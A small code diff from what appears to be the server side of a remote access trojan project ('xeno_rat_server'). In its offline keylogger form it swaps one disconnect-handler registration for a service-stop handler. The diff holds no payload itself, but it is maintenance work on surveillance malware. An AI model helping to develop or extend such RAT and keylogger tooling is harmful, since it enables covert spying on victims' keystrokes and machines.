@@ -18,7 +18,7 @@ namespace xeno_rat_server.Forms
         public OfflineKeylogger(Node _client)
         {
             client = _client;
-            client.AddTempOnDisconnect(OnTempDisconnect);
+            client.AddTempHandleServiceStop(OnTempDisconnect);
             InitializeComponent();
             InitializeAsync();
         }
